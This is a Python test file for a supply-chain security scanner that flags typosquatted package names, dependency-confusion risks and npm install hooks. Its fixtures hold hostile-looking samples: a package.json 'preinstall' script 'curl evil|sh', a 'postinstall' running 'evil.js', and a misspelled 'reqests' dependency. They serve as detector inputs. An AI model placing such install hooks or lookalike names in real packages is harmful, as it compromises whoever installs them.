"""Typosquat/dependency-confusion (heurística offline) + o adapter MaliciousDeps."""
from __future__ import annotations

from pathlib import Path

from secpipe.adapters.malicious_deps import MaliciousDepsScanner
from secpipe.domain import ScanStatus, Severity
from secpipe.domain.typosquat import (
    _PYPI_TOP,
    nearest_typosquat,
    osa_distance,
    parse_package_json,
    parse_requirements,
)


def test_osa_distance_and_transposition() -> None:
    assert osa_distance("requests", "requests") == 0
    assert osa_distance("reqests", "requests") == 1     # deleção
    assert osa_distance("reuqests", "requests") == 1     # transposição de adjacentes
    assert osa_distance("totallyunrelated", "requests") == 3   # capado (> cap)


def test_nearest_typosquat() -> None:
    assert nearest_typosquat("reqests", _PYPI_TOP) == "requests"
    assert nearest_typosquat("requests", _PYPI_TOP) is None      # exato = legítimo
    assert nearest_typosquat("my-unique-internal-pkg", _PYPI_TOP) is None


def test_parse_requirements() -> None:
    text = "requests==2.0\n# comentario\nflask>=1.0\n-e .\ngit+https://x\nDjango[argon2]~=4.0\n"
    assert parse_requirements(text) == ["requests", "flask", "Django"]


def test_parse_package_json_deps_and_hooks() -> None:
    pkg = '{"dependencies":{"lodash":"^4"},"scripts":{"postinstall":"node evil.js","test":"jest"}}'
    deps, hooks = parse_package_json(pkg)
    assert deps == ["lodash"] and hooks == ["postinstall"]


def test_scanner_flags_typosquat(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("reqests==1.0\nflask==2.0\n", encoding="utf-8")
    result = MaliciousDepsScanner().scan(str(tmp_path))
    assert result.status is ScanStatus.OK
    typos = [f for f in result.findings if f.rule_id == "typosquat"]
    assert len(typos) == 1 and typos[0].severity is Severity.HIGH and "requests" in typos[0].message


def test_scanner_flags_install_hook_and_confusion(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        '{"dependencies":{"@myorg/secret":"1.0"},"scripts":{"preinstall":"curl evil|sh"}}', encoding="utf-8")
    result = MaliciousDepsScanner(internal_prefixes=("@myorg/",)).scan(str(tmp_path))
    rules = {f.rule_id for f in result.findings}
    assert "install-hook" in rules and "dependency-confusion" in rules


def test_scanner_skips_without_manifest(tmp_path: Path) -> None:
    (tmp_path / "main.py").write_text("x=1\n", encoding="utf-8")
    assert MaliciousDepsScanner().scan(str(tmp_path)).status is ScanStatus.SKIPPED
